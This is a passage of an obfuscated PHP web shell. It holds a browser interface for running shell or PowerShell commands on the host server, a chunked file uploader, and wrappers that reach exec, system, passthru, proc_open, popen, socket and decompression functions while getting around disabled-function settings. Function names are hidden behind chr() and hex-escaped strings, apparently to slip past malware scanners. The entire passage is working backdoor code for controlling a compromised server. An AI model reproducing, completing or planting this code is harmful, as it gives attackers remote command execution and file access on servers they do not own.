            var isWin = <?php echo je(DIRECTORY_SEPARATOR === "\x5c"); ?>;
            var cmdMode = isWin ? 'powershell' : 'shell';

            var cmCmd = CodeMirror.fromTextArea(ta, {
                lineNumbers: false,
                styleActiveLine: true,
                matchBrackets: true,
                autoCloseBrackets: true,
                lineWrapping: false,
                theme: 'material-darker',
                mode: cmdMode,
                viewportMargin: Infinity,
                placeholder: 'Run Command'
            });

            CodeMirror.autoLoadMode(cmCmd, cmdMode);
            cmCmd.setSize('100%', 36);
            cmCmd.getWrapperElement().classList.add('cm-cmd-input');

            cmCmd.on('beforeChange', function(cm, change){
                var hasNewline = change.text && (change.text.length > 1 || /\r|\n/.test(change.text[0]));
                if (hasNewline) change.update(change.from, change.to, [' ']);
            });

            cmCmd.on('keydown', function(cm, e){
                if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                    e.preventDefault();
                    var form = document.getElementById('cmdForm');
                    if (form) form.submit();
                }
            });

            var form = document.getElementById('cmdForm');
            if (form) { form.addEventListener('submit', function(){ cmCmd.save(); }); }

            setTimeout(function(){ cmCmd.refresh(); }, 50);
            window.addEventListener('resize', function(){ cmCmd.refresh(); });
        })();

        // ===== CodeMirror for COMMAND OUTPUT =====
        (function(){
            var pre = document.getElementById('cmdOutPre');
            if(!pre || typeof CodeMirror === 'undefined') return;

            CodeMirror.modeURL = "https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/%N/%N.min.js";
            var isWin = <?php echo je(DIRECTORY_SEPARATOR === chr(92)); ?>;
            var outMode = isWin ? 'powershell' : 'shell';

            var txt = pre.textContent || '';
            var holder = document.createElement('div');
            pre.parentNode.replaceChild(holder, pre);

            var cmOut = CodeMirror(holder, {
                value: txt,
                readOnly: true,
                lineNumbers: true,
                lineWrapping: true,
                theme: 'material-darker',
                mode: outMode,
                viewportMargin: Infinity
            });

            CodeMirror.autoLoadMode(cmOut, outMode);
            cmOut.setSize('100%', 380);
            cmOut.getWrapperElement().classList.add('cm-cmd-output');

            setTimeout(function(){ cmOut.refresh(); }, 50);
            window.addEventListener('resize', function(){ cmOut.refresh(); });
        })();

        /* ---------- Chunked upload (large files) ---------- */
        function startChunkUpload(){
            var input = document.getElementById('chunkFiles');
            if(!input || !input.files || !input.files.length){ alert('Choose one or more files first.'); return; }
            var files = Array.prototype.slice.call(input.files);
            var btn = document.getElementById('chunkUploadBtn');
            var wrap = document.getElementById('chunkProgressWrap');
            var bar = document.getElementById('chunkBar');
            var status = document.getElementById('chunkStatus');
            var csrf = (document.getElementById('chunkCsrf')||{}).value || '';
            // Chunk size (characters/bytes) is editable in the UI; fall back to 3000.
            var CHUNK = parseInt((document.getElementById('chunkSize')||{}).value, 10);
            if(!(CHUNK > 0)){ CHUNK = 3000; }
            var CHUNK_DELAY_MS = 50;      // wait time after each successful chunk (50 ms)
            var actionUrl = '?a=chunk-upload&p=' + encodeURIComponent(<?php echo je($_2c22b0); ?>);

            if(wrap) wrap.classList.remove('hidden');
            if(btn){ btn.disabled = true; btn.style.opacity = '.6'; }

            function setBar(p){ if(bar) bar.style.width = Math.max(0, Math.min(100, p)) + '%'; }
            function setStatus(t){ if(status) status.textContent = t; }

            function uploadOne(file, done){
                var id = (Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 10));
                var total = Math.max(1, Math.ceil(file.size / CHUNK)); // 0-byte file => 1 empty chunk
                var index = 0;

                function sendNext(){
                    var start = index * CHUNK;
                    var end = Math.min(file.size, start + CHUNK);
                    var blob = (file.size === 0) ? new Blob([]) : file.slice(start, end);
                    var fd = new FormData();
                    fd.append('csrf', csrf);
                    fd.append('id', id);
                    fd.append('name', file.name);
                    fd.append('index', String(index));
                    fd.append('total', String(total));
                    fd.append('fsize', String(file.size));
                    fd.append('chunk', blob, 'chunk');

                    var httpStatus = 0;
                    fetch(actionUrl, { method: 'POST', body: fd, credentials: 'same-origin' })
                        .then(function(r){ httpStatus = r.status; return r.text(); })
                        .then(function(txt){
                            // Every chunk must come back HTTP 200, otherwise the upload failed.
                            if(httpStatus !== 200){ throw new Error('Fail to upload'); }
                            var data;
                            try { data = JSON.parse(txt); } catch(e){ throw new Error('Fail to upload'); }
                            if(!data.ok){ throw new Error('Fail to upload'); }
                            index++;
                            var frac = total > 0 ? (index / total) : 1;
                            setBar(frac * 100);
                            setStatus(file.name + ' — ' + index + '/' + total + ' chunks (' + CHUNK + ' chars each)');
                            if(data.done){ done(null); return; }
                            // Wait CHUNK_DELAY_MS after each chunk before sending the next one.
                            var waitLabel = CHUNK_DELAY_MS >= 1000 ? (Math.round(CHUNK_DELAY_MS / 1000) + 's') : (CHUNK_DELAY_MS + 'ms');
                            setStatus(file.name + ' — ' + index + '/' + total + ' chunks · waiting ' + waitLabel + '…');
                            setTimeout(sendNext, CHUNK_DELAY_MS);
                        })
                        .catch(function(err){ done(err); });
                }
                sendNext();
            }

            var i = 0;
            function next(){
                if(i >= files.length){
                    setStatus('Done. Reloading…');
                    setTimeout(function(){ window.location = '?p=' + encodeURIComponent(<?php echo je($_2c22b0); ?>); }, 400);
                    return;
                }
                var f = files[i];
                setStatus('Uploading ' + f.name + ' (' + (i+1) + '/' + files.length + ')…');
                setBar(0);
                uploadOne(f, function(err){
                    if(err){
                        setStatus('Fail to upload');
                        if(btn){ btn.disabled = false; btn.style.opacity = '1'; }
                        return;
                    }
                    i++;
                    next();
                });
            }
            next();
        }
    </script>
    </body>
    </html>
<?php



if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109).chr(95).chr(115).chr(111).chr(99).chr(107).chr(101).chr(116).chr(95).chr(99).chr(108).chr(105).chr(101).chr(110).chr(116))) {
    function fx_stream_socket_client($_d0e84e, &$_a18d4d = null, &$_8376fc = null, $_fc917d = 30, $_ae73f1 = 0, $_6303a0 = null)
    {
        if (is_fn_usable("\x73\x74\x72\x65\x61\x6d\x5f\x73\x6f\x63\x6b\x65\x74\x5f\x63\x6c\x69\x65\x6e\x74")) {
            return @stream_socket_client($_d0e84e, $_a18d4d, $_8376fc, $_fc917d, $_ae73f1, $_6303a0);
        }
        if (is_fn_usable("\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e")) {
            $_071742 = $_d0e84e;
            $_d6a173 = 0;
            if (stripos($_d0e84e, chr(116).chr(99).chr(112).chr(58).chr(47).chr(47)) === 0 || stripos($_d0e84e, chr(115).chr(115).chr(108).chr(58).chr(47).chr(47)) === 0 || stripos($_d0e84e, "\x74\x6c\x73\x3a\x2f\x2f") === 0) {
                $_06b18c = parse_url($_d0e84e);
                if ($_06b18c && isset($_06b18c[chr(104).chr(111).chr(115).chr(116)]) && isset($_06b18c[chr(112).chr(111).chr(114).chr(116)])) {
                    $_071742 = $_06b18c[chr(104).chr(111).chr(115).chr(116)];
                    $_d6a173 = $_06b18c["\x70\x6f\x72\x74"];
                }
            }
            else if (strpos($_d0e84e, chr(58)) !== false) {
                $_776c6d = explode(chr(58), $_d0e84e, 2);
                $_071742 = $_776c6d[0];
                $_d6a173 = (int)$_776c6d[1];
            }
            return @fsockopen($_071742, $_d6a173 ? $_d6a173 : 80, $_a18d4d, $_8376fc, $_fc917d);
        }
        $_a18d4d = 0;
        $_8376fc = "\x4e\x6f\x20\x73\x6f\x63\x6b\x65\x74\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65";
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(105).chr(110).chr(105).chr(95).chr(114).chr(101).chr(115).chr(116).chr(111).chr(114).chr(101))) {
    function fx_ini_restore($_33a971)
    {
        if (is_fn_usable("\x69\x6e\x69\x5f\x72\x65\x73\x74\x6f\x72\x65"))
            return @ini_restore($_33a971);
        return false; 
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(103).chr(122).chr(105).chr(110).chr(102).chr(108).chr(97).chr(116).chr(101))) {
    function fx_gzinflate($_6fb0dc, $_20de4c = 0)
    {
        if (is_fn_usable("\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65"))
            return @gzinflate($_6fb0dc, $_20de4c);
        if (is_fn_usable(chr(103).chr(122).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101)))
            return @gzdecode($_6fb0dc);
        if (is_fn_usable("\x67\x7a\x75\x6e\x63\x6f\x6d\x70\x72\x65\x73\x73"))
            return @gzuncompress($_6fb0dc);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(101).chr(120).chr(101).chr(99))) {
    function fx_exec($_7a966e, &$_36a62c = null, &$_92f104 = null)
    {
        if (is_fn_usable(chr(101).chr(120).chr(101).chr(99)))
            return @exec($_7a966e, $_36a62c, $_92f104);
        $_36a62c = array();
        $_92f104 = 127;
        return null;
    }
}
if (!function_exists("\x66\x78\x5f\x70\x61\x73\x73\x74\x68\x72\x75")) {
    function fx_passthru($_7a966e, &$_92f104 = null)
    {
        if (is_fn_usable(chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117)))
            return @passthru($_7a966e, $_92f104);
        $_92f104 = 127;
        return null;
    }
}
if (!function_exists("\x66\x78\x5f\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
    function fx_shell_exec($_7a966e)
    {
        if (is_fn_usable(chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)))
            return @shell_exec($_7a966e);
        return null;
    }
}
if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109))) {
    function fx_system($_7a966e, &$_92f104 = null)
    {
        if (is_fn_usable(chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)))
            return @system($_7a966e, $_92f104);
        $_92f104 = 127;
        return null;
    }
}
if (!function_exists("\x66\x78\x5f\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
    function fx_proc_open($_7a966e, $_6eefcb, &$_58bb9b, $_e159f9 = null, $_b501c4 = null)
    {
        if (is_fn_usable("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e"))
            return @proc_open($_7a966e, $_6eefcb, $_58bb9b, $_e159f9, $_b501c4);
        return false;
    }
}
if (!function_exists("\x66\x78\x5f\x70\x6f\x70\x65\x6e")) {
    function fx_popen($_7a966e, $_4ada7a)
    {
        if (is_fn_usable(chr(112).chr(111).chr(112).chr(101).chr(110)))
            return @popen($_7a966e, $_4ada7a);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(97).chr(114).chr(115).chr(101).chr(95).chr(105).chr(110).chr(105).chr(95).chr(102).chr(105).chr(108).chr(101))) {
    function fx_parse_ini_file($_2d246f, $_5164ce = false, $_627c5f = null)
    {
        if (is_fn_usable(chr(112).chr(97).chr(114).chr(115).chr(101).chr(95).chr(105).chr(110).chr(105).chr(95).chr(102).chr(105).chr(108).chr(101))) {
            if ($_627c5f === null)
                return @parse_ini_file($_2d246f, $_5164ce);
            return @parse_ini_file($_2d246f, $_5164ce, $_627c5f);
        }
        $_3c0f3b = @file_get_contents($_2d246f);
        if ($_3c0f3b === false)
            return false;
        if (is_fn_usable(chr(112).chr(97).chr(114).chr(115).chr(101).chr(95).chr(105).chr(110).chr(105).chr(95).chr(115).chr(116).chr(114).chr(105).chr(110).chr(103)))
            return @parse_ini_string($_3c0f3b, $_5164ce);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(115).chr(104).chr(111).chr(119).chr(95).chr(115).chr(111).chr(117).chr(114).chr(99).chr(101))) {
    function fx_show_source($_4f768b, $_553ed0 = false)
    {
        if (is_fn_usable(chr(115).chr(104).chr(111).chr(119).chr(95).chr(115).chr(111).chr(117).chr(114).chr(99).chr(101)))
            return @show_source($_4f768b, $_553ed0);
        if (is_fn_usable("\x68\x69\x67\x68\x6c\x69\x67\x68\x74\x5f\x66\x69\x6c\x65"))
            return @highlight_file($_4f768b, $_553ed0);
        $_4d44d9 = @file_get_contents($_4f768b);
        if ($_553ed0)
            return $_4d44d9;
        echo $_4d44d9;
        return true;
    }
}

if (!function_exists("\x66\x78\x5f\x73\x63\x61\x6e\x64\x69\x72")) {
    function fx_scandir($_425e76)
    {
        if (is_fn_usable(chr(115).chr(99).chr(97).chr(110).chr(100).chr(105).chr(114)))
            return @scandir($_425e76);
        $_84c87b = @opendir($_425e76);
        if (!$_84c87b)
            return false;
        $_862fdd = array();
        while (false !== ($_62af60 = readdir($_84c87b)))
            $_862fdd[] = $_62af60;
        closedir($_84c87b);
        return $_862fdd;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100))) {
    function fx_posix_getpwuid($_233452)
    {
        if (is_fn_usable("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64"))
            return @posix_getpwuid($_233452);
        return array(chr(110).chr(97).chr(109).chr(101) => @get_current_user(), "\x75\x69\x64" => $_233452);
    }
}
if (!function_exists("\x66\x78\x5f\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x67\x72\x67\x69\x64")) {
    function fx_posix_getgrgid($_0ed01f)
    {
        if (is_fn_usable(chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(103).chr(114).chr(103).chr(105).chr(100)))
            return @posix_getgrgid($_0ed01f);
        return array(chr(110).chr(97).chr(109).chr(101) => "\x75\x6e\x6b\x6e\x6f\x77\x6e", chr(103).chr(105).chr(100) => $_0ed01f);
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(100).chr(105).chr(115).chr(107).chr(102).chr(114).chr(101).chr(101).chr(115).chr(112).chr(97).chr(99).chr(101))) {
    function fx_diskfreespace($_0cad50)
    {
        if (is_fn_usable("\x64\x69\x73\x6b\x66\x72\x65\x65\x73\x70\x61\x63\x65"))
            return @diskfreespace($_0cad50);
        if (is_fn_usable("\x64\x69\x73\x6b\x5f\x66\x72\x65\x65\x5f\x73\x70\x61\x63\x65"))
            return @disk_free_space($_0cad50);
        return false;
    }
}

if (!function_exists(chr(102).chr(120).chr(95).chr(102).chr(105).chr(108).chr(101).chr(103).chr(114).chr(111).chr(117).chr(112))) {
    function fx_filegroup($_2d246f)
    {
        if (is_fn_usable(chr(102).chr(105).chr(108).chr(101).chr(103).chr(114).chr(111).chr(117).chr(112)))
            return @filegroup($_2d246f);
        return false;
    }
}

if (!function_exists("\x66\x78\x5f\x66\x74\x70\x5f\x63\x6f\x6e\x6e\x65\x63\x74")) {
    function fx_ftp_connect($_071742, $_d6a173 = 21, $_fc917d = 90)
    {
        if (is_fn_usable("\x66\x74\x70\x5f\x63\x6f\x6e\x6e\x65\x63\x74"))
            return @ftp_connect($_071742, $_d6a173, $_fc917d);
        if (is_fn_usable(chr(102).chr(115).chr(111).chr(99).chr(107).chr(111).chr(112).chr(101).chr(110)))
            return @fsockopen($_071742, $_d6a173, $_a18d4d, $_8376fc, $_fc917d);
        return false;
    }
}

if (!function_exists("\x66\x78\x5f\x73\x74\x72\x65\x61\x6d\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73")) {
    function fx_stream_get_contents($_6257ea, $_9954f5 = -1, $_facffb = -1)
    {
        if (is_fn_usable("\x73\x74\x72\x65\x61\x6d\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"))
            return @stream_get_contents($_6257ea, $_9954f5, $_facffb);
        if ($_facffb > 0)
            @fseek($_6257ea, $_facffb);
        $_6fb0dc = '';
        if ($_9954f5 === -1) {
            while (!feof($_6257ea)) {
                $_6fb0dc .= @fread($_6257ea, 8192);
            }
        }
        else {
            $_6fb0dc = @fread($_6257ea, $_9954f5);
        }
        return $_6fb0dc;
    }
}
